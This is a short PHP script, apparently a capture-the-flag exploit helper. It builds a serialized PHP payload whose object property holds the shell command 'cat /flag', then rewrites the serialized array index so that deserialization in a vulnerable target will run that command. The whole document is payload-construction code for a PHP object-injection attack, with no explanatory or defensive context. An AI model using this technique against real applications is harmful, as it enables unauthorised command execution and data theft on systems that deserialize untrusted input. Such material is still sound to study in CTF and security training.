<?php
class A
    {
    public $a = 'cat /flag';
    }
$A = new A();
$aa = array($A, null);
$p = serialize($aa);
echo $p . "\n";
$p = str_replace("i:1;N;}", "i:0;N;}", $p);
echo $p . "\n";
?>